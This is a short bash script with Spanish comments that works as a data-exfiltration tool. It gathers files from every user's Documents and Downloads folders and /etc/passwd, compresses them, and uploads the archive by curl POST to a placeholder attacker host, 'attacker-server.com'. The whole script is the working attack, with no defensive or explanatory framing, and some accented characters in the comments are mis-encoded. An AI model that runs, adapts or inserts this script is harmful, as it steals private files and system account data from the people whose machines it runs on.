#!/bin/bash

# URL del servidor de exfiltraci贸n
URL="http://attacker-server.com/upload"
DATA_DIR="/tmp/exfiltrated_data"
OUTPUT_FILE="/tmp/exfiltrated_data.tar.gz"

# Crear un directorio temporal para almacenar los datos
mkdir -p $DATA_DIR

# Recolectar archivos sensibles
echo "[+] Recolectando archivos sensibles..."
cp /home/*/Documents/* $DATA_DIR 2>/dev/null
cp /home/*/Downloads/* $DATA_DIR 2>/dev/null
cp /etc/passwd $DATA_DIR

# Comprimir los datos recolectados
echo "[+] Comprimiendo datos recolectados..."
tar -czf $OUTPUT_FILE -C $DATA_DIR .

# Verificar si el archivo comprimido existe
if [ ! -f "$OUTPUT_FILE" ]; then
    echo "Error al crear el archivo comprimido."
    exit 1
fi

# Exfiltrar los datos mediante HTTP POST
echo "[+] Exfiltrando datos a $URL..."
curl -X POST -F "file=@$OUTPUT_FILE" $URL

# Notificaci贸n de finalizaci贸n
echo "[+] Exfiltraci贸n de datos completada."
